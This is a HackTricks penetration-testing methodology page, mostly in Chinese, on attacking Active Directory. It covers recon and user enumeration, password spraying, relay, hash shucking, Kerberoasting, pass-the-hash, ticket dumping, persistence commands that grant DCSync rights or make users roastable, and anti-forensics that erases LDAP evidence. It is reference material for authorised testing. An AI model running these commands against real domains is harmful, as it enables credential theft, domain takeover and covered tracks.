# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** 是一项基础技术，允许 **网络管理员** 高效地创建和管理网络内的 **domains**, **users** 和 **objects**。它被设计为可伸缩的，便于将大量用户组织为可管理的 **groups** 和 **subgroups**，并在各个层级上控制 **access rights**。

**Active Directory** 的结构由三个主要层级组成：**domains**, **trees**, 和 **forests**。一个 **domain** 包含一组对象（例如 **users** 或 **devices**），共享一个公共数据库。**Trees** 是这些 domains 的分组，具有共同的结构；**forest** 表示由多个 trees 组成并通过 **trust relationships** 相互连接的集合，形成组织结构的最上层。可以在每个层级上指定特定的 **access** 和 **communication rights**。

Active Directory 的关键概念包括：

1. **Directory** – 存放所有与 Active Directory 对象相关的信息。
2. **Object** – 指目录中的实体，包括 **users**, **groups**, 或 **shared folders**。
3. **Domain** – 作为目录对象的容器，多个 domains 可以共存于同一 **forest** 中，每个 domain 都维护自己的对象集合。
4. **Tree** – 由共享根域的多个 domains 组成的分组。
5. **Forest** – Active Directory 中的最高组织结构，由若干 trees 组成，并在它们之间存在 **trust relationships**。

**Active Directory Domain Services (AD DS)** 包含了一系列对集中管理和网络通信至关重要的服务。 这些服务包括：

1. **Domain Services** – 集中存储数据并管理 **users** 与 **domains** 之间的交互，包括 **authentication** 和 **search** 功能。
2. **Certificate Services** – 管理安全 **digital certificates** 的生成、分发与维护。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持启用目录的应用程序。
4. **Directory Federation Services** – 为多个 web 应用提供 **single-sign-on** 能力，使用户在单次会话中完成认证。
5. **Rights Management** – 通过控制未经授权的分发和使用，帮助保护版权材料。
6. **DNS Service** – 对域名解析至关重要。

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

你可以访问 https://wadcoms.github.io/ 来快速查看可用于枚举/利用 AD 的常用命令。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

如果你只能接触到 AD 环境但没有任何凭据/会话，你可以：

- **Pentest the network:**
- 扫描网络，发现主机和开放端口，尝试 **exploit vulnerabilities** 或 **extract credentials**（例如，[printers could be very interesting targets](ad-information-in-printers.md)）。
- 枚举 DNS 可以提供关于域内关键服务器的信息，比如 web、printers、shares、vpn、media 等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用的 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 以获取关于如何执行这些操作的更多信息。
- **Check for null and Guest access on smb services**（这在现代 Windows 版本上通常无效）：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 有关如何枚举 SMB 服务器的更详细指南位于：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 有关如何枚举 LDAP 的更详细指南位于（对匿名访问请**特别注意**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- 通过 [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 收集凭据。
- 通过 [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 访问主机。
- 通过公开 [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 收集凭据。
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 从内部文档、社交媒体、域内的服务（主要是 web）以及公开可用资源中提取用户名/姓名。
- 如果你找到了公司员工的全名，可以尝试不同的 AD **username conventions**（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的命名规则有：_NameSurname_, _Name.Surname_, _NamSur_（每部分 3 个字母）, _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 个随机字母加 3 个随机数字（abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** 检查 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求的 **invalid username** 时，服务器会返回 Kerberos 错误代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_，从而让我们判断该用户名无效。**Valid usernames** 则会触发 AS-REP 中的 TGT 或返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表明该用户需要执行预认证（pre-authentication）。
- **No Authentication against MS-NRPC**: 在域控制器上对 MS-NRPC (Netlogon) 接口使用 auth-level = 1（No authentication）。该方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，以在没有任何凭据的情况下检查用户或计算机是否存在。该类枚举由工具 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 实现。相关研究可以在 [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) 找到。
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果在网络中发现了这些服务器，你也可以针对它进行 **user enumeration**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 你可以在 [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 和这个仓库 ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) 找到用户名列表。
>
> 不过，你应该已经在之前执行的 recon 步骤中获取到**公司在职人员的姓名**。有了名字和姓氏，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 来生成潜在的有效用户名。

### 已知一个或多个用户名

好了，假设你已经知道了一个有效的用户名但没有密码……可以尝试：

- [**ASREPRoast**](asreproast.md): 如果某个用户**没有**属性 _DONT_REQ_PREAUTH_，你可以**请求一个 AS_REP message** 给该用户，该消息会包含一些由用户密码派生并加密的数据。
- [**Password Spraying**](password-spraying.md): 对每个已发现的用户尝试最 **常见的密码**，也许有用户使用了弱密码（注意密码策略！）。
- 注意你也可以 **spray OWA servers** 来尝试访问用户的邮件服务器。

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你可能能够 **获取** 一些 challenge **hashes** 用来 crack，通过对网络的一些协议进行 **poisoning**：

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

如果你已经成功枚举了 Active Directory，你将会获得**更多的邮箱地址以及对网络更好的理解**。你可能能够强制 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 来获取对 AD 环境的访问。

### NetExec workspace-driven recon & relay posture checks

- 使用 **`nxcdb` workspaces** 来在每次 engagement 中保存 AD recon 状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下生成按协议划分的 SQLite DB（smb/mssql/winrm/ldap/etc）。使用 `proto smb|mssql|winrm` 切换视图，用 `creds` 列出收集到的 secrets。完成后手动清理敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。
- 使用 **`netexec smb <cidr>`** 快速发现子网，会显示 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth**。显示 `(signing:False)` 的主机是 **relay-prone**，而 DCs 通常要求签名。
- 从 NetExec 输出直接生成 **hostnames in /etc/hosts**，以便更容易定位目标：
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当 **SMB relay to the DC is blocked**（因 signing）时，仍应探测 **LDAP** 的 posture：`netexec ldap <dc>` 会突出显示 `(signing:None)` / 弱 channel binding。要求启用 SMB signing 但禁用 LDAP signing 的 DC 仍然是可用于滥用的 **relay-to-LDAP** 目标，例如 **SPN-less RBCD**。

### Client-side 打印机凭证 leaks → 批量域凭证验证

- 打印机/网页 UI 有时会在 HTML 中**嵌入被屏蔽的管理员密码**。查看 source/devtools 可能会显示明文（例如，`<input value="<password>">`），从而允许通过 Basic-auth 访问扫描/打印 存储库。
- 检索到的打印任务可能包含带有每用户密码的**明文入职文档**。测试时保持配对一致：
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### 窃取 NTLM Creds

如果你能够使用 **null 或 guest user** 访问其他 PC 或 共享，你可以 **放置文件**（比如 SCF 文件），当这些文件被访问时会**触发针对你的 NTLM 认证**，从而你可以**窃取** **NTLM challenge** 以破解它：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已持有的每个 NT 哈希当作其他更慢格式（其密钥材料直接从 NT 哈希派生）中的候选密码。与其在 Kerberos RC4 票据、NetNTLM 挑战或缓存凭证中暴力破解长口令，不如把 NT 哈希输入到 Hashcat 的 NT-candidate 模式，让它验证密码复用，而无需得知明文。这在域被攻破后尤其有效，你可以收集成千上万的当前和历史 NT 哈希。

在以下情况下使用 shucking：

- 你拥有来自 DCSync、SAM/SECURITY 转储或凭证保险库的 NT 语料库，需要测试在其他域/林中是否存在复用。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM 响应或 DCC/DCC2 blob。
- 你想快速证明对长且难以破解的口令的复用，并立即通过 Pass-the-Hash Pivot。

该技术**不适用于**其密钥不是 NT 哈希派生的加密类型（例如 Kerberos etype 17/18 AES）。如果域强制只使用 AES，则必须回到常规密码模式。

#### 构建 NT 哈希语料库

- **DCSync/NTDS** – 使用 `secretsdump.py`（带历史）抓取尽可能多的 NT 哈希（及其历史值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目会大幅扩展候选池，因为 Microsoft 每个账户最多可以存储 24 个之前的哈希。有关更多收集 NTDS secrets 的方法见：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – 使用 `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz 的 `lsadump::sam /patch`）提取本地 SAM/SECURITY 数据和缓存的域登录（DCC/DCC2）。对这些哈希去重并追加到同一 `nt_candidates.txt` 列表。
- **跟踪元数据** – 保留产生每个哈希的用户名/域（即便字典只包含十六进制）。一旦 Hashcat 打印出胜出候选，匹配的哈希会立刻告诉你哪个主体在复用密码。
- 优先选择来自相同林或受信任林的候选；这会最大化 shucking 时重合的可能性。

#### Hashcat NT-candidate modes

| 哈希类型                                  | 密码模式      | NT-Candidate 模式 |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate 输入**必须保持原始的 32 十六进制 NT 哈希**。禁用规则引擎（不要使用 `-r`，不要使用混合模式），因为变形会破坏候选密钥材料。
- 这些模式本身并不更快，但 NTLM 密钥空间（在 M3 Max 上约 ~30,000 MH/s）比 Kerberos RC4（约 ~300 MH/s）快约 100×。测试一个精心挑选的 NT 列表远比在慢格式中探索整个密码空间便宜得多。
- 始终运行 **最新的 Hashcat 构建**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 是近期加入的。
- 目前没有用于 AS-REQ Pre-Auth 的 NT 模式，且 AES etypes（19600/19700）需要明文密码，因为它们的密钥是通过 PBKDF2 从 UTF-16LE 密码派生的，而非原始 NT 哈希。

#### 示例 – Kerberoast RC4 (mode 35300)

1. 使用低权限用户为目标 SPN 捕获 RC4 TGS（详情见 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 使用你的 NT 列表对票据进行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 会从每个 NT 候选派生 RC4 密钥并验证 `$krb5tgs$23$...` blob。匹配确认该服务账户使用了你已知的某个 NT 哈希。

3. 立即通过 PtH 横向移动：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

如果需要，你也可以稍后通过 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文。

#### 示例 – 缓存凭证 (mode 31600)

1. 从被攻破的工作站转储缓存登录：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣的域用户的 DCC2 行复制到 `dcc2_highpriv.txt` 并进行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功匹配会给出你列表中已知的 NT 哈希，证明该缓存用户在复用密码。可直接用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`）或在快速 NTLM 模式下暴力破解以恢复明文。

同样的工作流适用于 NetNTLM 挑战-响应（`-m 27000/27100`）和 DCC（`-m 31500`）。一旦识别出匹配，你可以发起 relay、SMB/WMI/WinRM PtH，或离线用 masks/rules 重新破解 NT 哈希。

## Enumerating Active Directory WITH credentials/session

在此阶段你需要已经**攻破了一个有效域账户的凭证或会话**。如果你拥有一些有效凭证或以域用户的 shell，**请记住之前提到的选项仍然可用于攻破其他用户**。

在开始认证枚举之前，你应该了解 **Kerberos double hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 枚举

攻破一个账户是开始攻破整个域的**重要一步**，因为你将能够开始进行 **Active Directory 枚举：**

关于 [**ASREPRoast**](asreproast.md) 你现在可以找到所有可能的易受攻击用户，关于 [**Password Spraying**](password-spraying.md) 你可以获取 **所有用户名列表** 并尝试已被攻破账户的密码、空密码或其它有希望的新密码。

- 你可以使用 [**CMD 来执行基本侦察**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell 进行侦察**](../basic-powershell-for-pentesters/index.html)，这会更隐蔽
- 你还可以使用 [**powerview**](../basic-powershell-for-pentesters/powerview.md) 提取更详尽的信息
- 另一个用于 Active Directory 侦察的优秀工具是 [**BloodHound**](bloodhound.md)。它（取决于你使用的收集方法）**并不很隐蔽**，但**如果你不在意**，强烈建议尝试。查找用户可以 RDP 到的位置、找到到其他组的路径等。
- **其他自动化 AD 枚举工具有：** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD 的 DNS 记录**](ad-dns-records.md) 可能包含有趣信息。
- 一个带 GUI 的目录枚举工具是来自 SysInternal 套件的 **AdExplorer.exe**。
- 你还可以使用 **ldapsearch** 在 LDAP 数据库中搜索字段 _userPassword_ & _unixUserPassword_，甚至 _Description_ 字段以查找凭证。参见 PayloadsAllTheThings 上的 [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) 获取其它方法。
- 如果你使用 **Linux**，也可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 枚举域。
- 你也可以尝试以下自动化工具：
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

从 Windows 获取所有域用户名非常简单（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 上，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即便这个枚举章节看起来篇幅不大，它是最重要的部分。访问这些链接（主要是 cmd、powershell、powerview 和 BloodHound 的链接），学习如何枚举域并反复练习，直到你感到熟练。在评估过程中，这将是找到通往 DA 的关键时刻，或者判断无法进一步行动的时刻。

### Kerberoast

Kerberoasting 涉及获取与用户账户绑定的服务所使用的 **TGS tickets**，并离线破解其基于用户密码的加密。

更多详情见：


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

一旦你获得了一些凭证，可以检查是否对任何机器有访问权限。为此，你可以使用 **CrackMapExec** 根据端口扫描尝试用不同协议连接多台服务器。

### Local Privilege Escalation

如果你以普通域用户的身份获得了凭证或会话，并且使用该用户**对域内的任何机器有访问权**，你应该尝试在本地提升权限并搜集凭证。因为只有拥有本地管理员权限，你才能**转储其他用户的哈希**（内存中的 LSASS 或本地的 SAM）。

本书中有完整页面介绍 [**Windows 的本地权限提升**](../windows-local-privilege-escalation/index.html) 和一份 [**清单**](../checklist-windows-privilege-escalation.md)。另外，不要忘记使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### Current Session Tickets

在当前用户中找到能让你访问意外资源的 **tickets** 的可能性非常小，但你可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the Active Directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

现在你已经有了一些基本 credentials，你应该检查是否能 **找到** 在 AD 内共享的任何 **有趣的文件**。你可以手动完成，但这是一个非常无聊且重复的任务（如果发现数百个需要检查的文档会更多工作）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 请注意，这相当**嘈杂**，而 **LAPS** 可以**缓解**。

### MSSQL Abuse & Trusted Links

如果用户有权限**访问 MSSQL 实例**，他们可能能够利用它在 MSSQL 主机上**执行命令**（如果以 SA 身份运行）、**窃取** NetNTLM **hash**，甚至执行 **relay** **attack**。\
此外，如果一个 MSSQL 实例被另一个 MSSQL 实例信任（database link），且用户对受信任的数据库有权限，那么他将能够**利用信任关系在另一个实例中也执行查询**。这些信任可以串联，最终用户可能找到一个配置错误的数据库并在其上执行命令。\
**数据库之间的链接甚至在 forest trust 之间也能工作。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 资产/部署 平台 滥用

第三方清点与部署套件通常会暴露通往凭据和代码执行的强大路径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你发现任何具有属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 的 Computer 对象，且你在该计算机上拥有域权限，你将能够从登录到该计算机的每个用户的内存中转储 TGTs。\
因此，如果一位 **Domain Admin 登录到该计算机**，你将能够转储他的 TGT 并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
借助 constrained delegation，你甚至可以**自动攻陷 Print Server**（希望它是 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许使用 "Constrained Delegation"，它将能够**以任何用户的身份模拟以访问计算机上的某些服务**。\
然后，如果你**获取到该用户/计算机的 hash**，你将能够**冒充任何用户**（甚至 domain admins）来访问某些服务。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

对远程计算机的 Active Directory 对象拥有 **WRITE** 权限可以使得以**提升的权限**获得代码执行成为可能：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被攻陷的用户可能对某些域对象拥有一些**有趣的权限**，这可能让你后来**横向移动/提权**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

在域内发现**Spool 服务在监听**可以被**滥用**来**获取新凭据**并**提升权限**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果**其他用户**访问**被攻陷的**机器，就有可能**从内存中收集凭据**，甚至**在他们的进程中注入 beacons**以冒充他们。\
通常用户会通过 RDP 访问系统，这里介绍了对第三方 RDP 会话执行几种攻击的方法：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一个用于管理域加入计算机上的**本地 Administrator 密码**的系统，确保其**随机化**、唯一且经常**更改**。这些密码存储在 Active Directory 中，并通过 ACL 仅授予授权用户访问。拥有足够的权限访问这些密码后，就可以进行旁路并转向其他计算机。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**从被攻陷机器收集证书**可能是提升环境内权限的一种途径：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了**易受攻击的 templates**，则可以滥用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦你获得 **Domain Admin** 或更好的是 **Enterprise Admin** 权限，你就可以**转储域数据库**：_ntds.dit_。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

之前讨论的一些技术可以用于持久化。\
例如你可以：

- 使用户易受 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 使用户易受 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 授予某用户 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 通过使用 **NTLM hash**（例如 PC 帐户的 **hash**）为特定服务创建一个**合法的 Ticket Granting Service (TGS) ticket**。此方法用于**访问该服务的权限**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 涉及攻击者获取 Active Directory 环境中 **krbtgt 帐户的 NTLM hash**。该帐户用于签名所有 **Ticket Granting Tickets (TGTs)**，这些票证对于在 AD 网络内进行身份验证至关重要。

一旦攻击者获得该 hash，他们就可以为任何他们选择的帐户创建 **TGTs**（Silver ticket attack 的原理相似）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类票证类似于 golden tickets，但以一种**绕过常见 golden ticket 检测机制**的方式伪造。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有账户的证书或能够请求它们**是一种非常好的方式，可以在用户账户中保持持久化（即使用户更改密码）：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}

### **Certificates Domain Persistence**

**使用证书也可以在域内以高权限保持持久化：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过在这些组（如 Domain Admins 和 Enterprise Admins）上应用标准的 **Access Control List (ACL)** 来确保持权组的安全，以防止未经授权的更改。然而，该功能也可能被滥用；如果攻击者修改 AdminSDHolder 的 ACL 以向普通用户授予完全访问权限，该用户就会获得对所有特权组的广泛控制。除非密切监控，否则这一旨在保护的安全措施反而可能导致未经授权的访问。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

在每个 **Domain Controller (DC)** 内存在一个**本地管理员**账号。通过获取该机器的管理员权限，可以使用 **mimikatz** 提取本地 Administrator hash。随后需要修改注册表以**启用使用该密码**，从而允许远程访问本地 Administrator 帐户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以**赋予**某个**用户**对某些特定域对象的**特殊权限**，这将允许该用户在将来**提升权限**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于**存储**对象的**权限**。如果你能对对象的 **security descriptor** 做出**小改动**，你就可以在不成为特权组成员的情况下，获得对该对象的非常有价值的权限。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` 辅助类来创建具有 `entryTTL`/`msDS-Entry-Time-To-Die` 的短命主体/GPO/DNS 记录；它们会自我删除且不留下 tombstones，抹去 LDAP 证据，同时留下孤立的 SIDs、损坏的 `gPLink` 引用或缓存的 DNS 响应（例如，AdminSDHolder ACE 污染或恶意的 `gPCFileSysPath`/AD 集成 DNS 重定向）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

